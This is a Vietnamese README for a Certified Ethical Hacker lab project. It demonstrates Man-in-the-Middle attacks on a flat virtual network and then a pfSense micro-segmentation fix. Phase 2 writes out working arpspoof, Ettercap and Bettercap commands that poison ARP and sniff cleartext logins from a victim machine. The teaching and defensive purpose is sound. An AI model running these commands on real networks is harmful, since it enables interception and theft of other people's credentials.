# Lab CEH: Phân tích Tấn công Man-in-the-Middle & Lộ trình Chuyển đổi Kiến trúc Zero Trust

## 📌 Tổng quan Dự án
Kho lưu trữ này chứa tài liệu, cấu hình và tập lệnh cho dự án lab chuẩn Certified Ethical Hacker (CEH). Dự án minh họa các lỗ hổng của mạng phẳng truyền thống trước các cuộc tấn công Man-in-the-Middle (MitM) và Nghe lén (Sniffing), đồng thời đề xuất lộ trình chuyển đổi sang Kiến trúc Zero Trust sử dụng tính năng vi phân đoạn (micro-segmentation) của tường lửa pfSense để vô hiệu hóa các mối đe dọa này.

## ⚠️ Cảnh báo Pháp lý (Disclaimer)
**Chỉ phục vụ mục đích giáo dục:** Dự án này hoàn toàn phục vụ cho mục đích học tập, nghiên cứu và đào tạo Hacking đạo đức (Ethical Hacking). Tác giả không chịu trách nhiệm cho bất kỳ hành vi lạm dụng nào đối với các kỹ thuật được đề cập.

## 🛠️ Giai đoạn 1: Thiết lập Mạng phẳng Truyền thống (Trạng thái Dễ bị tổn thương)

### 1. Cấu hình Mạng Máy ảo
Trong giai đoạn kiểm thử ban đầu, tất cả các máy ảo được đặt chung trong một miền quảng bá (broadcast domain):
- **Máy Nạn nhân (Windows 10):** `VMnet12` (IP: 192.168.10.20)
- **Máy chủ Mục tiêu (Windows Server 2022):** `VMnet12` (IP: 192.168.10.10)
- **Máy Tấn công (Kali Linux):** `VMnet12` (IP: 192.168.10.15)
- **Tường lửa (pfSense):** `NAT` (WAN) và `VMnet12` (LAN)

### 2. Cấu hình Web Server mồi
1. Cài đặt Web Server (IIS) trên máy Windows Server 2022.
2. Truy cập vào đường dẫn `C:\inetpub\wwwroot` và xóa các file mặc định.
3. Đặt tệp `index.html` (chứa biểu mẫu đăng nhập truyền văn bản thô) đã được cung cấp vào thư mục này.

## ⚔️ Giai đoạn 2: Tấn công MitM & Nghe lén (Kali Linux)

Trước khi khởi chạy tấn công, bắt buộc bật tính năng chuyển tiếp IP (IP forwarding) trên Kali Linux để máy đóng vai trò như bộ định tuyến trung gian:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
Phương pháp A: Sử dụng Arpspoof & Wireshark
Thực thi ARP Spoofing để bẻ lái lưu lượng giữa Nạn nhân và Máy chủ:

Bash
sudo arpspoof -i eth0 -r -t 192.168.10.20 192.168.10.10
Mở Wireshark, lắng nghe trên cổng eth0 và áp dụng bộ lọc http để bóc tách thông tin đăng nhập dạng văn bản thô (cleartext).

Phương pháp B: Sử dụng Ettercap
Thực thi Ettercap ở chế độ dòng lệnh để tự động hóa quá trình đầu độc ARP và bóc tách mật khẩu:

Bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.10.20// /192.168.10.10//
Phương pháp C: Sử dụng Bettercap Framework
Khởi chạy Bettercap trên card mạng đang hoạt động:

Bash
sudo bettercap -iface eth0
Bên trong giao diện dòng lệnh của Bettercap, chạy tuần tự các mô-đun sau:

Plaintext
net.probe on
set arp.spoof.targets 192.168.10.20, 192.168.10.10
arp.spoof on
net.sniff on
🛡️ Giai đoạn 3: Kiến trúc Zero Trust & Vi phân đoạn
Để vô hiệu hóa triệt để lỗ hổng ở Tầng Liên kết dữ liệu (Layer 2), mạng được tái cấu trúc bằng kỹ thuật vi phân đoạn (micro-segmentation) trên pfSense.

1. Tái cấu trúc Card mạng
Tường lửa pfSense: 4 Cổng mạng -> WAN (NAT), LAN (VMnet12), OPT1 (VMnet13), OPT2 (VMnet14)

Windows Server: Chuyển sang vùng VMnet13 (IP: 192.168.20.10)

Windows 10 (Nạn nhân): Giữ nguyên ở vùng VMnet12 (IP: 192.168.10.20)

Kali Linux (Kẻ tấn công): Chuyển sang vùng VMnet14 (Bị cô lập hoàn toàn thành Mạng tối - Dark Network)

2. Cấu hình Luật Tường lửa pfSense (Triển khai Zero Trust)
Tạo Nhóm (Alias): Tạo nhóm AD_IIS_Ports chứa các cổng dịch vụ thiết yếu (Port: 53, 80, 88, 389, 445).

Luật Cho phép (Mức ưu tiên cao nhất): Action: Pass, Interface: LAN. Chỉ cho phép truy cập từ IP 192.168.10.20 đến đích 192.168.20.10 thông qua các cổng đích nằm trong nhóm AD_IIS_Ports.

Luật Từ chối Mặc định (Mức ưu tiên thấp nhất): Action: Block, Interface: LAN. Chặn đứng toàn bộ mọi luồng lưu lượng còn lại phát sinh từ phân vùng mạng Nạn nhân.

Cô lập Kẻ tấn công: Phân vùng mạng OPT2 (chứa Kali Linux) tự động áp dụng chính sách Từ chối Mặc định (Default Deny) từ hệ thống gốc. Điều này phá vỡ hoàn toàn miền quảng bá, khiến mọi nỗ lực quét mạng hay giả mạo ARP đều thất bại và bị lưu vết (Log) trên tường lửa.
